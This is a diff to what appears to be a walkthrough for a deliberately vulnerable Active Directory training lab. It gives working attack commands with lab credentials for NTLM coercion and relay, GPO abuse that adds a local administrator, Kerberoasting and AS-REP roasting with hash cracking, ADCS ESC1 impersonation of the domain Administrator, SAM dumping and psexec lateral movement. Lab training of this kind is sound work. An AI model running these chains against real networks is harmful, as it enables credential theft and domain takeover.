@@ -102,10 +102,10 @@ hashcat -m 5500 ~/breakingbAD/demo/hashes/ntlmv1.txt /usr/share/john/password.ls
 
 ```bash
 # Verify WebClient is running
-nxc smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
+nxc smb 192.168.100.21 -u walter.white -p "774azeG!" -M webdav
 
 # Coerce authentication via WebDAV (PetitPotam over HTTP)
-PetitPotam.py -u walter.white -p '774azeG!' -d breakingbad.local attacker@80/test 192.168.100.21
+PetitPotam.py -u walter.white -p "774azeG!" -d breakingbad.local attacker@80/test 192.168.100.21
 
 # Combine with ntlmrelayx for relay attacks
 ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
@@ -118,21 +118,26 @@ ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
 **Target:** dc01 / GPO "Los Pollos Hermanos" | **What:** Authenticated Users have full edit rights on the GPO linked to OU=Cartel. Any domain user can inject a scheduled task for RCE.
 
 ```bash
-# Enumerate GPO permissions
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse
+# Enumerate writable GPOs with bloodyAD
+bloodyAD -u walter.white -p "774azeG!" -d breakingbad.local --host 192.168.100.10 get writable --otype GPO --right WRITE
+
+# Or check GPO DACL with nxc daclread
+nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" -M daclread \
+  -o TARGET_DN="CN={B3FBBE10-7816-4754-AFBC-B82D41A050F2},CN=Policies,CN=System,DC=breakingbad,DC=local" ACTION=read
 
 # Check with BloodHound
-bloodhound-python -u walter.white -p '774azeG!' -d breakingbad.local -dc dc01.breakingbad.local -c all
+bloodhound-python -u walter.white -p "774azeG!" -d breakingbad.local -dc dc01.breakingbad.local -c all
 
 # Abuse with pyGPOAbuse (add local admin or reverse shell)
-pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
+pygpoabuse.py breakingbad.local/walter.white:"774azeG!" \
+  -gpo-id "B3FBBE10-7816-4754-AFBC-B82D41A050F2" \
   -command 'net localgroup Administrators walter.white /add' -taskname 'update' -f
 
 # Or use SharpGPOAbuse from Windows
 SharpGPOAbuse.exe --AddLocalAdmin --UserAccount walter.white --GPOName "Los Pollos Hermanos"
 
 # Force gpupdate on target (or wait)
-nxc smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
+nxc smb 192.168.100.20 -u walter.white -p "774azeG!" -x 'gpupdate /force'
 ```
 
 ---
@@ -185,17 +190,17 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 ```bash
 # Query with netexec
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
+nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" -M get-desc-users
 
 # Query with ldapsearch
-ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '774azeG!' \
-  -b 'OU=Cartel,DC=breakingbad,DC=local' '(sAMAccountName=saul.goodman)' description
+ldapsearch -x -H ldap://192.168.100.10 -D "walter.white@breakingbad.local" -w "774azeG!" \
+  -b "OU=Cartel,DC=breakingbad,DC=local" "(sAMAccountName=saul.goodman)" description
 
 # Or with rpcclient
-rpcclient -U 'walter.white%774azeG!' 192.168.100.10 -c 'queryuser saul.goodman'
+rpcclient -U "walter.white%774azeG!" 192.168.100.10 -c 'queryuser saul.goodman'
 
 # Verify the password works
-nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
+nxc smb 192.168.100.10 -u saul.goodman -p "657crsH!"
 ```
 
 ---
@@ -206,10 +211,10 @@ nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
 
 ```bash
 # Find kerberoastable users (output to demo/hashes)
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting ~/breakingbAD/demo/hashes/kerberoast.txt
+nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" --kerberoasting ~/breakingbAD/demo/hashes/kerberoast.txt
 
 # Or with impacket
-GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt
+GetUserSPNs.py breakingbad.local/walter.white:"774azeG!" -dc-ip 192.168.100.10 -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt
 
 # Crack the TGS hash (mode 13100)
 hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/password.lst
@@ -217,7 +222,7 @@ hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/passwo
 ~/breakingbAD/demo/hashcrack.sh kerberoast
 
 # Verify cracked password
-nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
+nxc smb 192.168.100.10 -u hector.salamanca -p "346modL!"
 ```
 
 ---
@@ -228,7 +233,7 @@ nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
 
 ```bash
 # Find users without pre-auth (output to demo/hashes)
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast ~/breakingbAD/demo/hashes/asreproast.txt
+nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" --asreproast ~/breakingbAD/demo/hashes/asreproast.txt
 
 # Or with impacket (no creds needed if you know the username)
 GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat -outputfile ~/breakingbAD/demo/hashes/asreproast.txt
@@ -242,7 +247,7 @@ hashcat -m 18200 ~/breakingbAD/demo/hashes/asreproast.txt /usr/share/john/passwo
 ~/breakingbAD/demo/hashcrack.sh asreproast
 
 # Verify cracked password
-nxc smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
+nxc smb 192.168.100.10 -u jessie.pinkman -p "313lksV!"
 ```
 
 ---
@@ -253,12 +258,17 @@ nxc smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
 
 ```bash
 # Find vulnerable templates
-certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable -stdout
+certipy find -u walter.white@breakingbad.local -p "774azeG!" -dc-ip 192.168.100.10 -vulnerable -stdout
 
-# Request a certificate as Administrator using the ESC1 template
-certipy req -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 \
+# Request a certificate as Administrator using the ESC1 template (via DCOM)
+certipy req -u walter.white@breakingbad.local -p "774azeG!" -dc-ip 192.168.100.10 \
   -target dc01.breakingbad.local -ca breakingbad-ca -template ESC1 \
-  -upn administrator@breakingbad.local
+  -upn administrator@breakingbad.local -dcom
+
+# Or via web enrollment (HTTP)
+certipy req -u walter.white@breakingbad.local -p "774azeG!" -dc-ip 192.168.100.10 \
+  -target dc01.breakingbad.local -ca breakingbad-ca -template ESC1 \
+  -upn administrator@breakingbad.local -web -http-scheme http -no-channel-binding
 
 # Authenticate with the certificate
 certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10
@@ -295,17 +305,17 @@ enum4linux-ng -A 192.168.100.10
 
 ```bash
 # Verify creds work on both servers
-nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
+nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p "Zomer123!" --local-auth
 
 # Dump SAM on srv01
-nxc smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam
+nxc smb 192.168.100.20 -u svc_admin -p "Zomer123!" --local-auth --sam
 
 # Use same creds to move to srv02
-nxc smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'
+nxc smb 192.168.100.21 -u svc_admin -p "Zomer123!" --local-auth -x 'whoami'
 
 # Or get a shell with psexec
-psexec.py svc_admin:'Zomer123!'@192.168.100.20
-psexec.py svc_admin:'Zomer123!'@192.168.100.21
+psexec.py svc_admin:"Zomer123!"@192.168.100.20
+psexec.py svc_admin:"Zomer123!"@192.168.100.21
 ```
 
 ---
